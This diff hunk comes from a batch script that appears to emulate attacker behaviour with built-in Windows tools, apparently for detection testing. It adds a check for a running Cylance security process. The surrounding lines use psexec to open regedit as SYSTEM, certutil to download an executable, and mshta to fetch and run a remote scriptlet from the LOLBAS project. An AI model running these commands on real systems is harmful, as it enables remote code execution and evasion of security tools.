@@ -186,6 +186,8 @@ psexec -s -i -d regedit
 ECHO ============================
 "powershell.exe" get-process | where {$_.Description -like "*$windefend*"}
 ECHO ============================
+"powershell.exe" get-process | where {$_.Description -like "*$cylance*"}
+ECHO ============================
 certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
 ECHO ============================
 mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct").Exec();close();
